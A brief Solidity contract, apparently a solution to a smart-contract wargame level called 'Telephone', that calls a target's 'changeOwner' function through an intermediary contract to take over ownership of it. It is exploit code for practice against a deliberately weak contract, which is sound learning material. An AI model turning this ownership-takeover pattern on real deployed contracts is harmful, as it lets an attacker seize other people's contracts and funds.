// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

contract Telephone {
    function solve(address target, address newOwner) external {
        (bool success, ) = target.call(
            abi.encodeWithSignature("changeOwner(address)", newOwner)
        );
        if (!success) revert CallNotSuccess();
    }
}
